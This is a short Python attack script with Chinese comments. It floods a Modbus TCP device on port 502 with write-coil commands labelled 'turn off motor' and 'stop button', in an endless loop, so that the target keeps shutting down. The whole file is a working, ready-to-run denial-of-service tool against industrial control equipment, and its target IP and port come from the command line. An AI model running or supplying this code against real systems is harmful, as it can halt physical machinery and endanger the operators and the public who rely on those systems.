# coding=utf-8
"""
DATE:   2022/4/18
AUTHOR: TesterCC
"""

import optparse
import socket
import time

"""
向目标端口发送指定功能码，使得目标不停的进行关机操作，无法正常运行。
python code_query_flooding.py --ip 10.0.0.47 --port 502

ModBus默认502
"""


class modbus_tcp():
    def __init__(self):
        self.transaction_identifier = '\x00\x00'
        self.protocol_identifier = '\x00\x00'
        self.unit_identifier = '\x00'
        self.function_code = '\x05'
        self.data = '\x00\x03\x00'
        self.length = '\x00' + chr(len(self.unit_identifier + self.function_code + self.data))

    def pack(modbus):
        modbus.length = '\x00' + chr(len(modbus.unit_identifier + modbus.function_code + modbus.data))
        modbus_packet = modbus.transaction_identifier + modbus.protocol_identifier + modbus.length + modbus.unit_identifier + modbus.function_code + modbus.data
        return modbus_packet


def start_attack(dst_ip, dst_port):
    print((f"[+] attack info: {dst_ip}:{dst_port} ..."))

    i = 0   # count attack times
    while True:
        try:
            payload = modbus_tcp()
            payload.data = '\x00\x03\x00\x00'
            payload2 = modbus_tcp()
            payload2.data = '\x00\x01\xff\x00'
            modbus_frame = payload.pack()
            modbus_frame2 = payload2.pack()
            modbus_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = modbus_socket.connect((dst_ip, dst_port))
            modbus_socket.send(modbus_frame2.encode())  # 关闭电机
            time.sleep(1)
            modbus_socket.send(modbus_frame.encode())  # stop按钮
            i += 1
            print(f"[*] attack times: {i}")

        except ConnectionError:
            print("[x] modbus connect failed!")


def main():
    parser = optparse.OptionParser('usage: python3 %prog --ip 1.1.1.1 --port 502\n')
    parser.add_option('-i', '--ip', dest='attack_ip', type='string', help='attack ip')
    parser.add_option('-p', '--port', dest='attack_port', default=502, type='int', help='attack port')

    options, args = parser.parse_args()

    if options.attack_ip:
        start_attack(options.attack_ip, int(options.attack_port))
    else:
        raise ValueError("No args --ip ")


if __name__ == '__main__':
    main()
